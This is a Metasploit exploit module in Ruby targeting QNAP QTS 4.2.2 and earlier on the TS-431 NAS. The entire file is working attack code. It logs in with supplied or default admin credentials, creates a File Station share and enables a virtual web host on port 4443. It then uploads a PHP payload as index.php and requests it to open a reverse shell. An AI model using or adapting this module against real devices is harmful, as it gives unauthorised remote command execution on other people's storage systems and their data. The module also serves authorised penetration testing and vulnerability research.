##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

    def initialize
    super(
      'Name'           => 'QNAP TS-431 QTS < 4.2.2 - Remote Command Execution',
      'Description'    => %q{
        This module creates a virtual web server and uploads the php payload into it.
        Admin privileges cannot access any server files except File Station files.
        The user who is authorized to create Virtual Web Server can upload malicious php file by activating the server.
        Exploit creates a new directory into File Station to connect to the web server.
        However, only the "index.php" file is allowed to work in the virtual web server directory.
        No files can be executed except "index.php". Gives an access error.
        After the harmful "index.php" has been uploaded, the shell can be retrieved from the server.
        There is also the possibility of working in higher versions.
      },
      'Author'         => [
        'AkkuS <Özkan Mustafa Akkuş>', # Vulnerability Discovery, PoC & Msf Module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://pentest.com.tr/exploits/QNAP-QTS-4-2-2-Remote-Command-Execution-Metasploit.html'],
        ],
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          ['QNAP QTS <= 4.2.2', {}]
        ],
      'DisclosureDate' => '06 March 2019',
      'Privileged'     => false,
      'DefaultTarget' => 0
    )

    register_options(
        [
          OptBool.new('SSL', [true, 'Use SSL', false]),
          OptString.new('TARGETURI', [true, 'The base path to QNAP', '/']),
          OptString.new('USER', [true, 'User to login with', 'admin']),
          OptString.new('PASS', [true, 'Password to login with', 'admin']),
        ], self.class)
    end
##
# Check Exploit Vulnerable
##
  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri, "/cgi-bin/login.html")
    })

   if res and res.code == 200 and res.body =~ /dc=4.2./
      return Exploit::CheckCode::Vulnerable
   else
      return Exploit::CheckCode::Safe
    end
    return res
  end
##
# Login
##
  def exploit

    b64pwd = Base64.encode64("#{datastore['PASS']}")
    b64 = b64pwd.split('=').first

    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri, "/cgi-bin/authLogin.cgi"),
      'vars_post' => {
          "user" => datastore['USER'],
          "pwd" => "#{b64}=",
          "serviceKey" => "1"
      }
    })

    if res and res.code == 200 and res.body =~ /authSid/
      print_good("Login successful")
      nasid = res.body.split("authSid><![CDATA[")[1].split("]")[0]
      print_status("sid = #{nasid}")
    else
      print_error("Login failed")
    end
##
# Update Login Time with sid
##
    cookie = "NAS_USER=#{datastore['USER']}; NAS_SID=#{nasid}; home=1; showQuickStart=1"
    res = send_request_cgi({
      'method' => 'POST',
      'cookie' => cookie,
      'uri'    => normalize_uri(target_uri, "/cgi-bin/userConfig.cgi"),
      'vars_post' => {
          "func" => "updateLoginTime",
          "sid" => "#{nasid}"
      }
    })

    if res and res.code == 200 and res.body =~ /true/
      print_good("Update Login Time Successful")
    else
      print_error("Update failed")
    end

##
# Create Folder in File Station for Web Server
##
    cmdfile = "cmd#{rand_text_alphanumeric(rand(5) + 5)}"
    print_status("Web Folder = /#{cmdfile}")
    print_status("Attempting to create a folder via File Station.")
    res = send_request_cgi({
      'method' => 'POST',
      'cookie' => cookie,
      'uri'    => normalize_uri(target_uri, "/cgi-bin/wizReq.cgi?&wiz_func=share_create&action=add_share"),
      'vars_post' => {
          "share_name" => cmdfile,
          "comment" => "",
          "guest" => "deny",
          "hidden" => "0",
          "oplocks" => "1",
          "EncryptData" => "0",
          "wizard_filter" => "",
          "user_wizard_filter" => "",
          "userw0" => "#{datastore['USER']}",
          "userd_len" => "0",
          "userw_len" => "1",
          "usero_len" => "0",
          "access_r" => "setup_users",
          "img_file_path" => "",
          "path_type" => "auto",
          "quotaSettings" => "",
          "quota_size" => "",
          "recycle_bin" => "1",
          "recycle_bin_administrators_only" => "0",
          "quotaRadio" => "0",
          "vol_no" => "1",
          "addToMediaFolder" => "0",
          "qsync" => "0",
          "sid" => "#{nasid}"
      }
    })

    if res and res.code == 200 and res.body =~ /buildTime/
      print_good("File Create Successful")
    else
      print_error("File Create Failed")
    end
##
# Enable Virtual Host
##
    print_status("Attempting to Enable Virtual Host")
    res = send_request_cgi({
      'method' => 'POST',
      'cookie' => cookie,
      'uri'    => normalize_uri(target_uri, "/cgi-bin/net/networkRequest.cgi?&subfunc=web_srv&apply=1&todo=set_enable"),
      'vars_post' => {
          "enable" => "1",
          "sid" => "#{nasid}"
      }
    })

    if res and res.code == 200
      print_good("Virtual Host Enabled")
    else
      print_error("Process Failed")
    end
##
# Enable Virtual Host
##
    print_status("Attempting to Create Virtual Host")
    res = send_request_cgi({
      'method' => 'POST',
      'cookie' => cookie,
      'uri'    => normalize_uri(target_uri, "/cgi-bin/net/networkRequest.cgi?&subfunc=web_srv"),
      'vars_post' => {
          "apply" => "1",
          "share_folder" => "1",
          "manual_path" => cmdfile,
          "vhost_name" => "cmd",
          "vhost_port" => "4443",
          "vhost_ssl" => "0",
          "todo" => "add_vhost",
          "sid" => "#{nasid}"
      }
    })

    if res and res.code == 200
      print_good("Virtual Host Started on port 4443")
    else
      print_error("Process Failed")
    end
##
# Fetching upload_id information
##
    print_status("Attempting to Upload get Upload ID")
    res = send_request_cgi({
      'method' => 'POST',
      'cookie' => cookie,
      'uri'    => normalize_uri(target_uri, "/cgi-bin/filemanager/utilRequest.cgi?func=start_chunked_upload"),
      'vars_post' => {
          "upload_root_dir" => "/#{cmdfile}",
          "sid" => "#{nasid}"
      }
    })

    if res and res.code == 200 and res.body =~ /upload_id/
      print_good("Login successful")
      uploadid = res.body.split("upload_id")[1].split('"')[2]
      print_status("Upload ID = #{uploadid}")
    else
      print_error("Login failed")
    end
##
# Upload Payload
##
    boundary = Rex::Text.rand_text_alphanumeric(29)

    data = "-----------------------------{boundary}"
    data << "\r\nContent-Disposition: form-data; name=\"fileName\"\r\n\r\n"
    data << "msf.php\r\n-----------------------------{boundary}"
    data << "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"blob\"\r\n"
    data << "Content-Type: application/octet-stream\r\n\r\n"
    data << payload.encoded
    data << "\r\n-----------------------------{boundary}--\r\n"

    print_status("Attempting to Upload Payload to Reverse Shell")

    res = send_request_raw(
      {
        'method' => "POST",
        'uri'     => normalize_uri(target_uri, "/cgi-bin/filemanager/utilRequest.cgi?sid=#{nasid}&func=chunked_upload&dest_path=/#{cmdfile}&overwrite=1&upload_root_dir=/#{cmdfile}&upload_id=#{uploadid}&offset=0&filesize=1115&upload_name=index.php&settime=1&mtime=1551868245"),
        'data' => data,
        'headers' =>
        {
          'Content-Type'   => 'multipart/form-data; boundary=---------------------------{boundary}',
        },
        'cookie'  => cookie
      })

    if res and res.code == 200
      print_good("Payload Uploaded Successful")
    else
      print_error("Upload Failed")
    end
##
# Execute the Payload
##
    print_status("Attempting to execute the payload...")

    res = request_url("http://#{rhost}:4443/index.php")

    if res and res.code == 200
      print_good "Payload executed successfully"
    end
  end
end
##
# End
##